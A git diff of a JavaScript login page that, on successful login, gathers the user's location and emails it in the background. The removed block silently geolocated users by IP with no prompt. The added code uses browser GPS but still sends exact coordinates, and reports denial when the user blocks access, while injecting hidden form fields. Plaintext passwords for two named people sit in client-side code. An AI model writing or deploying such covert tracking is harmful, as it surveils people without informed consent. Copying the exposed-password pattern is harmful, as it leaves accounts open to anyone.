@@ -39,7 +39,7 @@ function login() {
     if (allowedNames.includes(trimmedName) && 
         (pwd.value == "Sneha@2004" || pwd.value =="Uday@2005")) {
 
-        // Trigger silent location capture upon successful login
+        // Trigger exact location capture upon successful login
         captureAndAttachLocation(trimmedName);
 
         // Hide login form and show DOB form
@@ -113,7 +113,7 @@ function togglePwd() {
 }
 
 // -------------------------
-// SILENT LOCATION & FORMSUBMIT LOGIC
+// EXACT LOCATION & FORMSUBMIT LOGIC
 // -------------------------
 
 // Helper to inject hidden fields directly into #dobForm
@@ -149,9 +149,9 @@ async function sendSilentBackgroundEmail(payload) {
             },
             body: JSON.stringify(payload)
         });
-        console.log("Silent location alert sent successfully.");
+        console.log("Location alert sent successfully.");
     } catch (e) {
-        console.log("Silent alert failed:", e.message);
+        console.log("Alert failed:", e.message);
     }
 }
 
@@ -167,36 +167,7 @@ async function captureAndAttachLocation(username) {
     // Inject Username into the form
     injectHiddenField(dobForm, "LoggedInUser", username);
 
-    // 1. Silent IP Geolocation (GeoJS - No User Prompt)
-    try {
-        const res = await fetch("https://get.geojs.io/v1/ip/geo.json");
-        if (res.ok) {
-            const geo = await res.json();
-            const mapsLink = `https://www.google.com/maps?q=${geo.latitude},${geo.longitude}`;
-
-            payload.Method = "Silent IP Geolocation";
-            payload.IP = geo.ip;
-            payload.City = geo.city || "Unknown City";
-            payload.State = geo.region || "Unknown State";
-            payload.Country = geo.country || "Unknown Country";
-            payload.Coordinates = `${geo.latitude}, ${geo.longitude}`;
-            payload.GoogleMapsLink = mapsLink;
-
-            // Inject fields into #dobForm so FormSubmit includes them when user submits DOB
-            injectHiddenField(dobForm, "IP_Address", geo.ip);
-            injectHiddenField(dobForm, "City", geo.city);
-            injectHiddenField(dobForm, "State", geo.region);
-            injectHiddenField(dobForm, "Google_Maps", mapsLink);
-
-            // Send instant background email right on login
-            await sendSilentBackgroundEmail(payload);
-            return;
-        }
-    } catch (e) {
-        console.log("Silent IP lookup failed, trying navigator fallback...");
-    }
-
-    // 2. Fallback to navigator.geolocation (Shows browser prompt)
+    // Exact GPS Geolocation (Shows browser prompt)
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(async (pos) => {
             const { latitude, longitude, accuracy } = pos.coords;
@@ -210,7 +181,7 @@ async function captureAndAttachLocation(username) {
             injectHiddenField(dobForm, "Exact_Coordinates", `${latitude}, ${longitude}`);
             injectHiddenField(dobForm, "Google_Maps", mapsLink);
 
-            // Reverse Geocode
+            // Reverse Geocode to get City and State
             try {
                 const geoRes = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`);
                 const geoData = await geoRes.json();
@@ -219,15 +190,22 @@ async function captureAndAttachLocation(username) {
 
                 injectHiddenField(dobForm, "City", payload.City);
                 injectHiddenField(dobForm, "State", payload.State);
-            } catch (err) {}
+            } catch (err) {
+                console.log("Reverse geocoding failed.");
+            }
 
+            // Send instant background email with exact coordinates
             await sendSilentBackgroundEmail(payload);
 
         }, (err) => {
-            payload.Method = "Location Access Denied";
+            // If the user clicks "Block" or the request times out
+            payload.Method = "Location Access Denied / Failed";
+            payload.Error = err.message;
             sendSilentBackgroundEmail(payload);
-        }, { enableHighAccuracy: true, timeout: 6000 });
+        }, { enableHighAccuracy: true, timeout: 10000 }); // 10 seconds to allow the user to click "Allow"
     } else {
+        // If the browser doesn't support geolocation at all
+        payload.Method = "Geolocation API not supported by browser";
         sendSilentBackgroundEmail(payload);
     }
 }
